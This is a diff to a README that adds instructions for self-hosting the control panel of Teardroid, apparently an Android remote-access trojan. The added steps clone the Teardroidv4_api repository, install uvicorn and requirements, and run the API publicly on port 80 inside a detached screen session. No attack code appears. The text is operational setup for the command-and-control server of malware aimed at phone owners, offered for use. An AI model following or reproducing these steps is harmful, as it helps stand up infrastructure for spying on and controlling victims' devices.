@@ -34,3 +34,41 @@ $ cp -r * ../teardroid_control/
 ```bash
 $ deta deploy
 ```
+
+### Run control panel on your own server
+
+- Clone [Teardroidv4_api](https://github.com/ScRiPt1337/Teardroidv4_api) repo using the command below
+
+```bash
+$ git clone https://github.com/ScRiPt1337/Teardroidv4_api
+```
+
+- Install uvicorn
+
+```bash
+$ sudo apt-get install uvicorn
+$ python3 -m pip install uvicorn
+```
+
+- Change dir to Teardroidv4_api
+
+```bash
+$ cd Teardroidv4_api
+```
+
+- Install all dependency
+
+```bash
+$ pip install -r requirements.txt
+```
+
+- Run teardroid api
+
+```bash
+$ screen
+# press enter to go inside the screen session
+$ uvicorn main:app --host 0.0.0.0 --port 80
+# now close your terminal windows  and we are good to go
+```
+
+- Done
